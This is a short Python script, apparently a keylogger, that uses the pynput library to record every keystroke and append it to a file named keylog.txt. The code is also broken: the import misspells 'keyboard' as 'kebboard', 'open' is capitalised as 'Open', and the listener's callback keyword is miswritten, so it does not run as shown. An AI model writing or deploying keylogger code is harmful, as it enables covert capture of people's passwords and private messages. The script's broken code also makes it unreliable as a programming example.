from pynput import kebboard   
import os

output_file = "keylog.txt"
def On_Press(key):
    try:
        with Open(output_file, 'a')as f:
            f.write(key.char)
    except AttributeError:
        with Open(output_file, 'a')as f:
            f.write(f'[{str(key)}]')


with keyboard.Listener(On_Press=On_Press) as listener:
    listener.join()
        
